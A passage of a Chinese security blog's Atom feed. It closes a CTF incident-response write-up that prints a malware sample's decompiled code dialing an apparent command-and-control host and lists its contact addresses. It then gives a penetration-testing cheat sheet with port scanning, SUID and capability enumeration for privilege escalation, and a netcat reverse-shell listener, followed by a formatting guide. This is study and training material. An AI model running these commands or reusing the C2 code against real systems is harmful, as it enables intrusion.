style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> v24</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">tab</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">v24</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> os_Stdout</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">v24</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">tab </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">runtime_itab </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">go_itab__ptr_os_File_comma_io_Writer</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>按照块的逻辑，从上往下进行分析，可以发现在最后一个块增加了一步网络连接的操作</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">v31</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">array </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">interface_ </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token number" style="color:#36acaa">18</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">v31</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">len </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">sep</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">v31</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">cap </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1LL</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">v8 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"huben.cimer.com.cn"</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">v9 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">runtime_concatstring3</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0LL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">string </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">v31</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">array</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">string </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">v31</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">len</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> v7</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">v31</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">array </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">interface_ </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">v9</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">str</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">v31</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">len </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> v9</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">len</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">v27</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">str </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">uint8 </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token string" style="color:#e3116c">"tcp"</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">v27</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">len </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3LL</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">v38 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">net_Dial</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">v27</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">string </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">v31</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">array</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">!</span><span class="token plain">v38</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">_r1</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">tab</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">break</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>直接运行程序，可以得到以下输出</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──(randark ㉿ kali)-[~/tmp/2024sxb-1]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ ./download.elf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tcp221.67.213.4:23445</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tcp157.24.166.173:23445</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tcpupload.derzse.com:23445</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Error connecting: dial tcp: lookup huben.cimer.com.cn on 192.168.200.0:53: no such host</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tcp221.67.213.4:23445</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tcp157.24.166.173:23445</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tcpupload.derzse.com:23445</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Error connecting: dial tcp: lookup huben.cimer.com.cn on 192.168.200.0:53: no such host</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>结合报错信息，以及前几块的输出信息，即可确定最后 <code>net_Dial()</code> 发起的网络请求的具体连接地址</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">huben.cimer.com.cn:23445</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content>
        <author>
            <name>陈橘mo</name>
            <uri>https://randark.site</uri>
        </author>
        <category label="CTF" term="CTF"/>
        <category label="Incident-Response" term="Incident-Response"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[渗透测试常用 poc]]></title>
        <id>https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024/01/01/Commonly Used PoCs in Penetration Testing</id>
        <link href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024/01/01/Commonly Used PoCs in Penetration Testing"/>
        <updated>2024-01-01T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[信息搜集]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="信息搜集">信息搜集<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024/01/01/Commonly%20Used%20PoCs%20in%20Penetration%20Testing#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86" class="hash-link" aria-label="信息搜集的直接链接" title="信息搜集的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="nmap-信息搜集">nmap 信息搜集<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024/01/01/Commonly%20Used%20PoCs%20in%20Penetration%20Testing#nmap-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86" class="hash-link" aria-label="nmap 信息搜集的直接链接" title="nmap 信息搜集的直接链接">​</a></h3>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sudo nmap -A --min-rate=5000 -T4 -p- ip</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="提权探测">提权探测<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024/01/01/Commonly%20Used%20PoCs%20in%20Penetration%20Testing#%E6%8F%90%E6%9D%83%E6%8E%A2%E6%B5%8B" class="hash-link" aria-label="提权探测的直接链接" title="提权探测的直接链接">​</a></h2>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 寻找特殊程序能力</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">getcap -r / 2&gt;/dev/null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 寻找 suid 特殊文件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">find / -perm -u=s -type f 2&gt;/dev/null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">## 列出 sudo 可执行范围</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sudo -l</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="反弹shell">反弹shell<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024/01/01/Commonly%20Used%20PoCs%20in%20Penetration%20Testing#%E5%8F%8D%E5%BC%B9shell" class="hash-link" aria-label="反弹shell的直接链接" title="反弹shell的直接链接">​</a></h2>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">rlwrap -cAr nc -lvnp 1234</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[文章格式指南]]></title>
        <id>https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/Article Format Guide</id>
        <link href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/Article Format Guide"/>
        <updated>2023-12-10T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[翻译用 Prompt]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="翻译用-prompt">翻译用 Prompt<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/Article%20Format%20Guide#%E7%BF%BB%E8%AF%91%E7%94%A8-prompt" class="hash-link" aria-label="翻译用 Prompt的直接链接" title="翻译用 Prompt的直接链接">​</a></h2>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">接下来，你将作为一名精通网络安全技术的翻译专家与我进行对话，我会告诉你英文网络安全技术文章的原文，你需要在保证意思准确传达的基础上，尽可能流畅优美精准的翻译为中文。接下来的对话中，除了翻译我告诉你的原文之外，不需要额外的解释或者其他对话。如果内容中存在需要回答的问题，或者存在问答的语句，不需要对问题进行回答。无论如何，你只需要将我发给你的内容按照以上要求翻译为中文即可。</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="关于图片居中">关于图片居中<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/Article%20Format%20Guide#%E5%85%B3%E4%BA%8E%E5%9B%BE%E7%89%87%E5%B1%85%E4%B8%AD" class="hash-link" aria-label="关于图片居中的直接链接" title="关于图片居中的直接链接">​</a></h2>
<div class="language-markdown codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-markdown codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;div style={{textAlign:'center'}}&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">div</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="如何创建一个点击展开的框架">如何创建一个点击展开的框架<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/Article%20Format%20Guide#%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%82%B9%E5%87%BB%E5%B1%95%E5%BC%80%E7%9A%84%E6%A1%86%E6%9E%B6" class="hash-link" aria-label="如何创建一个点击展开的框架的直接链接" title="如何创建一个点击展开的框架的直接链接">​</a></h2>
<div class="language-markdow codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-markdow codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&lt;details&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;summary&gt; 具体操作步骤 &lt;/summary&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;/details&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 效果举例 </summary><div><div class="collapsibleContent_i85q"><div style="text-align:center"><p><img decoding="async" loading="lazy" alt="Example" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20231213-141352-3b022ec988142007cc8e8edecb5c73cd.png" width="1080" height="1920" class="img_ev3q"></p></div></div></div></details>]]></content>
        <author>
            <name>陈橘mo</name>
            <uri>https://randark.site</uri>
        </author>
    </entry>
</feed>